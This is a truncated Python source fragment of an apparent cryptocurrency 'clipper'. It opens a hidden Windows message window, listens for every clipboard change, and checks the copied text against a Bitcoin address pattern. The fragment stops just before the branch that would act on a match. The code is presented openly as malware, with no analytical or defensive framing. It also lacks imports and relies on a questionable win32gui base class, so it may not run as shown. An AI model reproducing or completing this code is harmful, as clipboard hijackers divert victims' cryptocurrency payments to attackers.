class Clipper:
    def __init__(self):
        self.enabled = True

    def run(self):
        if not self.enabled:
            return
        print("[+] Clipper is starting...")
        self.notification_form = NotificationForm()
        self.notification_form.Show()

class NotificationForm(win32gui.Window):
    def __init__(self):
        self.current_clipboard = win32clipboard.GetClipboardText()
        super().__init__(win32con.HWND_MESSAGE)
        self.add_clipboard_format_listener(self.handle)

    def add_clipboard_format_listener(self, hwnd):
        win32clipboard.AddClipboardFormatListener(hwnd)

    def wnd_proc(self, m):
        if m.msg == win32con.WM_CLIPBOARDUPDATE:
            self.current_clipboard = win32clipboard.GetClipboardText()

            if re.match(r'\b(bc1|[13])[a-zA-HJ-NP-Z0-9]{26,35}\b', self.current_clipboard):
